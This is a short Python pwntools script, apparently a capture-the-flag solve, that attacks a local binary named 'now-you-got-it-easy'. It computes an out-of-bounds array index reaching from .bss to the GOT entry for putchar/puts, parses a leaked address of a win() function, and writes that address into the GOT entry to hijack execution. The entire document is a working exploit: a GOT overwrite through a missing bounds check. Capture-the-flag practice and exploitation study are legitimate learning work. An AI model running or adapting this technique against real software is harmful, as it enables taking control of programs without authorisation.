from pwn import *

p = process("./now-you-got-it-easy")

index = 2992
call_offset = 0x18 # putchar (check got)

got_offset = 0x5000
bssdata_offset = 0x5220

reach_bssdata = -(index / 8)
reach_got = ((got_offset - bssdata_offset) / 8)

to_reach_got_from_bssdata = (reach_bssdata) + (reach_got)
to_reach_call_from_got = to_reach_got_from_bssdata + (call_offset / 8)
to_reach_call_from_got = int(to_reach_call_from_got)

print("puts@got to write to at index ::" , to_reach_call_from_got)

x = p.clean()
print(x)

win_leak_addr = int(x.split(b"win is located at:")[-1].split(b'\n')[0].strip(), 16)

print("[+] Leak win() :: ", win_leak_addr)

p.sendline(str(to_reach_call_from_got).encode())

p.sendline(str(win_leak_addr).encode())

print(p.clean())

p.close()
